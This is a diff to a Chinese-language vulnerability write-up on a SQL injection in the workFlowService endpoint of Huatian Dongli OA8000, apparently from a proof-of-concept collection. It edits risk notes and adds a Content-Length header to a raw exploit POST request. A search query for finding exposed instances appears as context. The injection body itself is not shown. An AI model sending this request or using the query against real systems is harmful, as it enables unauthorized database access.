@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -73,6 +73,7 @@ app="华天动力-OA8000"
 POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
 Host: 、
 Accept-Encoding: identity
+Content-Length: 103
 Accept-Language: zh-CN,zh;q=0.8
 Accept: */*
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
@@ -87,7 +88,7 @@ Cache-Control: max-age=0
 </buffalo-call>
 ```
 
-> 请求长度说明：原资料 Content-Length 为 103；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 103；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![img](./.resource/华天动力OA-8000版-workFlowService-SQL注入漏洞/media/1628496737082-cede14dc-71ae-4ec3-83da-e0707e4f8f4f.png)
 
